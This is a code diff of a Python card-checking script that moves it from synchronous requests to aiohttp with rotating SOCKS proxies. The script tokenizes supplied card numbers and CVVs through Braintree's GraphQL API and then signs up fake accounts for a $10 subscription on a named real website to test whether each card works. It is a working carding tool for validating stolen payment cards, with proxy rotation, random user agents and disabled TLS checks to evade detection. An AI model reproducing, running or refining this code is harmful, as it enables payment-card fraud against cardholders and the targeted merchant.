@@ -1,11 +1,10 @@
-import requests
+import aiohttp
+from aiohttp_socks import ProxyConnector
 import json
 import base64
 import random
 import string
 import asyncio
-import urllib3
-urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 BASE = "https://www.mixtapemobstaz.com"
 GRAPHQL = "https://payments.braintree-api.com/graphql"
@@ -57,177 +56,154 @@ def classify(msg):
 
     return "declined", msg[:80] if msg else "Declined"
 
-
 def _format_proxy(p):
     if not p:
         return None
     ps = str(p).strip()
     if ps.startswith(("http://", "https://", "socks5://", "socks4://")):
-        return ps
-    parts = ps.split(":")
-    if len(parts) == 4:
-        if parts[1].isdigit():
-            return f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
-        elif parts[3].isdigit():
-            return f"http://{parts[0]}:{parts[1]}@{parts[2]}:{parts[3]}"
+        formatted = ps
+    else:
+        parts = ps.split(":")
+        if len(parts) == 4:
+            if parts[1].isdigit():
+                formatted = f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
+            elif parts[3].isdigit():
+                formatted = f"http://{parts[0]}:{parts[1]}@{parts[2]}:{parts[3]}"
+            else:
+                formatted = f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
+        elif len(parts) == 2:
+            formatted = f"http://{parts[0]}:{parts[1]}"
         else:
-            return f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
-    elif len(parts) == 2:
-        return f"http://{parts[0]}:{parts[1]}"
-    return f"http://{ps}"
+            formatted = f"http://{ps}"
 
-def check_card_mixtape_sync(cc, mm, yy, cvc, proxy_url=None):
+    if formatted.startswith("socks5://"):
+        formatted = formatted.replace("socks5://", "socks5h://")
+    elif formatted.startswith("socks4://"):
+        formatted = formatted.replace("socks4://", "socks4a://")
+
+    return formatted
+
+async def check_card_mixtape(cc, mm, yy, cvc, proxy_url=None):
     """
-    Synchronous Braintree $10 Subscription check on mixtapemobstaz.com.
+    Asynchronous Braintree $10 Subscription check on mixtapemobstaz.com.
     Returns: (status, message, brand)
     """
     if len(yy) == 2:
         yy = f"20{yy}"
 
-    s = requests.Session()
-    s.headers.update({
+    formatted_proxy = _format_proxy(proxy_url)
+
+    headers_base = {
         'User-Agent': random.choice(UAS),
         'Accept-Language': 'en-US,en;q=0.9',
         'Accept': 'application/json, text/plain, */*',
-    })
-
-    formatted_proxy = _format_proxy(proxy_url)
-    if formatted_proxy:
-        s.proxies.update({"http": formatted_proxy, "https": formatted_proxy})
+    }
 
     try:
-        # Step 1: Get Braintree Client Token
-        token = ""
-        try:
-            r_tok = s.get(f"{BASE}/api/user/braintree-client-token-public", timeout=15, verify=False)
-            if r_tok.status_code == 200:
-                data_tok = r_tok.json()
-                token = data_tok.get('clientToken', '')
-        except Exception:
-            pass
+        if formatted_proxy:
+            connector = ProxyConnector.from_url(formatted_proxy, ssl=False)
+        else:
+            connector = aiohttp.TCPConnector(ssl=False)
 
-        # If proxy returned HTML, error page, or failed connection, retry directly
-        if not token:
-            s.proxies.clear()
+        timeout = aiohttp.ClientTimeout(total=20, connect=8)
+        async with aiohttp.ClientSession(connector=connector, headers=headers_base, timeout=timeout) as session:
+            # Step 1: Get Braintree Client Token
+            token = ""
             try:
-                r_tok = s.get(f"{BASE}/api/user/braintree-client-token-public", timeout=15, verify=False)
-                if r_tok.status_code == 200:
-                    data_tok = r_tok.json()
-                    token = data_tok.get('clientToken', '')
+                async with session.get(f"{BASE}/api/user/braintree-client-token-public") as r_tok:
+                    if r_tok.status == 200:
+                        data_tok = await r_tok.json()
+                        token = data_tok.get('clientToken', '')
+            except Exception:
+                pass
+
+            if not token:
+                return "error", "Failed to fetch Braintree token", "N/A"
+
+            try:
+                padded = token + '=' * (4 - len(token) % 4)
+                decoded = json.loads(base64.b64decode(padded))
+                auth_fp = decoded.get('authorizationFingerprint')
             except Exception as e:
-                return "error", f"Failed to fetch Braintree token: {e}", "N/A"
+                return "error", f"Failed to decode authorization fingerprint: {e}", "N/A"
 
-        if not token:
-            return "error", "Failed to fetch Braintree token", "N/A"
+            if not auth_fp:
+                return "error", "Failed to decode authorization fingerprint", "N/A"
 
-        try:
-            padded = token + '=' * (4 - len(token) % 4)
-            decoded = json.loads(base64.b64decode(padded))
-            auth_fp = decoded.get('authorizationFingerprint')
-        except Exception as e:
-            return "error", f"Failed to decode authorization fingerprint: {e}", "N/A"
-
-        if not auth_fp:
-            return "error", "Failed to decode authorization fingerprint", "N/A"
-
-        # Step 2: Tokenize Card via Braintree GraphQL
-        try:
-            r_gql = s.post(GRAPHQL, json={
-                'query': TOKENIZE_QUERY,
-                'variables': {"input": {"creditCard": {
-                    "number": cc, "expirationMonth": mm,
-                    "expirationYear": yy, "cvv": cvc
-                }, "options": {"validate": False}}},
-                'operationName': 'TokenizeCreditCard'
-            }, headers={
+            # Step 2: Tokenize Card via Braintree GraphQL
+            gql_headers = {
                 'Authorization': f'Bearer {auth_fp}',
                 'Braintree-Version': '2018-05-10',
                 'Content-Type': 'application/json',
                 'Origin': BASE,
-            }, timeout=15, verify=False)
-            data_gql = r_gql.json()
-        except Exception:
-            # Fallback direct if proxy choked on GraphQL
-            s.proxies.clear()
-            r_gql = s.post(GRAPHQL, json={
-                'query': TOKENIZE_QUERY,
-                'variables': {"input": {"creditCard": {
-                    "number": cc, "expirationMonth": mm,
-                    "expirationYear": yy, "cvv": cvc
-                }, "options": {"validate": False}}},
-                'operationName': 'TokenizeCreditCard'
-            }, headers={
-                'Authorization': f'Bearer {auth_fp}',
-                'Braintree-Version': '2018-05-10',
-                'Content-Type': 'application/json',
-                'Origin': BASE,
-            }, timeout=15, verify=False)
-            data_gql = r_gql.json()
-
-        tc = data_gql.get('data', {}).get('tokenizeCreditCard', {})
-        nonce = tc.get('token')
-        card_info = tc.get('creditCard', {})
-        brand = card_info.get('brandCode', 'Braintree')
-
-        if not nonce:
-            gql_errors = data_gql.get('errors', [])
-            if gql_errors and isinstance(gql_errors, list):
-                first_err = gql_errors[0].get('message', 'Braintree Card Tokenization Failed')
-                return "declined", first_err, brand
-            return "error", "Braintree Card Tokenization Failed", brand
-
-        # Step 3: Subscribe
-        username, email, password, phone = rand_user()
-        sub_payload = {
-            "username": username,
-            "email": email,
-            "password": password,
-            "mobilephone": phone,
-            "invite_code": None,
-            "plan_id": "plan-01",
-            "braintreePayment": {
-                "nonce": nonce,
-                "details": {
-                    "cardholderName": None,
-                    "expirationMonth": mm,
-                    "expirationYear": yy,
-                    "bin": cc[:6],
-                    "cardType": brand,
-                    "lastFour": cc[-4:],
-                    "lastTwo": cc[-2:],
-                },
-                "type": "CreditCard",
-                "description": f"ending in {cc[-4:]}",
-                "binData": card_info.get('binData', {}),
             }
-        }
-        sub_headers = {
-            'Content-Type': 'application/json',
-            'Accept': 'application/json, text/plain, */*',
-            'Origin': BASE,
-            'Referer': f"{BASE}/signup-plan/plan-01",
-        }
+            gql_payload = {
+                'query': TOKENIZE_QUERY,
+                'variables': {"input": {"creditCard": {
+                    "number": cc, "expirationMonth": mm,
+                    "expirationYear": yy, "cvv": cvc
+                }, "options": {"validate": False}}},
+                'operationName': 'TokenizeCreditCard'
+            }
+            async with session.post(GRAPHQL, json=gql_payload, headers=gql_headers) as r_gql:
+                data_gql = await r_gql.json()
 
-        try:
-            r_sub = s.post(f"{BASE}/api/user/subscribe2", json=sub_payload, headers=sub_headers, timeout=20, verify=False)
-        except Exception:
-            s.proxies.clear()
-            r_sub = s.post(f"{BASE}/api/user/subscribe2", json=sub_payload, headers=sub_headers, timeout=20, verify=False)
+            tc = data_gql.get('data', {}).get('tokenizeCreditCard', {})
+            nonce = tc.get('token')
+            card_info = tc.get('creditCard', {})
+            brand = card_info.get('brandCode', 'Braintree')
 
-        try:
-            resp = r_sub.json()
-            msg = resp.get('msg', '') or resp.get('message', '')
-        except Exception:
-            msg = r_sub.text[:100]
+            if not nonce:
+                gql_errors = data_gql.get('errors', [])
+                if gql_errors and isinstance(gql_errors, list):
+                    first_err = gql_errors[0].get('message', 'Braintree Card Tokenization Failed')
+                    return "declined", first_err, brand
+                return "error", "Braintree Card Tokenization Failed", brand
 
-        status, reason = classify(msg)
-        return status, reason, brand
+            # Step 3: Subscribe
+            username, email, password, phone = rand_user()
+            sub_payload = {
+                "username": username,
+                "email": email,
+                "password": password,
+                "mobilephone": phone,
+                "invite_code": None,
+                "plan_id": "plan-01",
+                "braintreePayment": {
+                    "nonce": nonce,
+                    "details": {
+                        "cardholderName": None,
+                        "expirationMonth": mm,
+                        "expirationYear": yy,
+                        "bin": cc[:6],
+                        "cardType": brand,
+                        "lastFour": cc[-4:],
+                        "lastTwo": cc[-2:],
+                    },
+                    "type": "CreditCard",
+                    "description": f"ending in {cc[-4:]}",
+                    "binData": card_info.get('binData', {}),
+                }
+            }
+            sub_headers = {
+                'Content-Type': 'application/json',
+                'Accept': 'application/json, text/plain, */*',
+                'Origin': BASE,
+                'Referer': f"{BASE}/signup-plan/plan-01",
+            }
 
+            async with session.post(f"{BASE}/api/user/subscribe2", json=sub_payload, headers=sub_headers) as r_sub:
+                try:
+                    resp = await r_sub.json()
+                    msg = resp.get('msg', '') or resp.get('message', '')
+                except Exception:
+                    msg = (await r_sub.text())[:100]
+
+            status, reason = classify(msg)
+            return status, reason, brand
+
+    except asyncio.TimeoutError:
+        return "error", "Connection timed out", "N/A"
     except Exception as e:
         return "error", str(e), "N/A"
 
-async def check_card_mixtape(cc, mm, yy, cvc, proxy_url=None):
-    """
-    Async wrapper for check_card_mixtape_sync.
-    """
-    return await asyncio.to_thread(check_card_mixtape_sync, cc, mm, yy, cvc, proxy_url=proxy_url)
